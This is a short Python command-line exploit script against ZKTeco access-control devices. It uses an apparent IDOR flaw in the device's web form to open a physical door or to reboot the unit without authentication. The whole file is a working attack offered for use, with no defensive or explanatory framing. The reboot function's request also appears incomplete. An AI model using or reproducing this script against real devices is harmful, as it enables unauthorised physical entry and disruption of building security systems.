#!/usr/bin/env python

import argparse
import requests
from termcolor import colored

def open_door(ip):
    """
    Open the door of a ZKTeco device using an IDOR vulnerability.

    Args:
        ip (str): The IP address of the Ztec device.

    Returns:
        None
    """
    door = "http://" + ip + "/form/Device?act=9"
    try:
      print(colored(f"\n[*] Trying...", 'yellow'))
      response = requests.get(door, timeout=1)
    except requests.Timeout:
      print(colored(f"[!] Time out\n", 'red'))
    else:
      print(colored(f"[{response.status_code}] Open sesame!\n", 'green'))

def reboot(ip):
    """
    Reboot a ZKTeco device using an IDOR vulnerability

    Args:
        ip (str): The IP address of the Ztec device.

    Returns:
        None
    """

    door = "http://" + ip + "/form/Device"
    try:
      print(colored(f"\n[*] Trying...", 'yellow'))
      response = requests.get(door, timeout=1)
    except requests.Timeout:
      print(colored(f"[!] Time out\n", 'red'))
    else:
      print(colored(f"[{response.status_code}] Rebooting \n", 'green'))

def main():
    """
    Main function to handle command-line arguments and execute corresponding actions.

    Usage:
        python zkteco.py [options] <ip>

    Options:
        -o, --open       Open the door
        -r, --reboot     Reboot device

    Arguments:
        ip               Device IP address
    """
    parser = argparse.ArgumentParser(prog='zkteco', 
                                     description="Exploit IDOR in ZKTeco")
    parser.add_argument('ip', 
                        type=str,
                        help='Device IP')
    # Create mutually exclusive group for open and reboot actions
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-o', '--open', 
                       action='store_true', 
                       help='Open the door')
    group.add_argument('-r', '--reboot',
                       action='store_true', 
                       help='Reboot device')
    
    args = parser.parse_args()

    if(args.open):
       open_door(args.ip)
    elif(args.reboot):
       reboot(args.ip)

if __name__ == "__main__":
    main()